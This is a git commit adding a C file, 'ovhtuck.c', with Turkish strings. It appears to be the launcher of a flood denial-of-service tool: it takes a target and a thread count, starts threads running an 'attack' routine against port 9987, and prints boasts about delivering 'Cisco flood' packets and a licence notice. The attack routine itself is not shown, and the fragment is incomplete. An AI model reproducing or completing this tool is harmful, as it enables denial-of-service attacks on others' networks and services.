777eee49ca08e10b6a4ebf069ae74b06a38a6b70
rodri0001 <95370588+rodri0001@users.noreply.github.com>
2022-12-04 12:13:31 +0300

    Add files via upload

---
+++ ovhtuck.c
@@ -0,0 +1,35 @@
+int bypasslakocum(int kontrol, char *durum[ ])
+{
+        if(kontrol < 4){
+        	    fprintf(stdout, "Cisco Flood Srx 3600 Paketi Kargo Gibi Adrese Teslim Eder :) ...\n");
+                fprintf(stderr, "Rodriquez....\n", durum[0]);
+                exit(-1);
+        }
+
+    
+ 
+ 
+        int i = 0;
+        fprintf(stdout, "Lisans Kontrolu Dostum, Lisansiniz Yoksa İletisime Geciniz...\n");
+        int max_paket = 128;
+        char *veri = (char *) malloc(max_paket);
+        veri = memset(veri, 0x00, max_paket);
+        int islemcimiktari = atoi(durum[3]);
+        pthread_t cekirdek[islemcimiktari];
+        struct cekirdek_verisi td[islemcimiktari];
+		portumuz = 9987;
+        for(i = 0;i<islemcimiktari;i++){
+                pthread_create( &cekirdek[i], NULL, &saldir, (void *) durum[1]);
+        }
+        fprintf(stdout, "İstanbul Sabiha Gökcen Havalimani İyi Uçuşlar Diler Adamimmm....\n");
+        fprintf(stdout, "Coded Rodriquez... \n");
+        if(kontrol > 4)
+        {
+                sleep(atoi(durum[4]));
+        } else {
+                while(1){
+                        sleep(1);
+                }
+        }
+        return 0;
+}
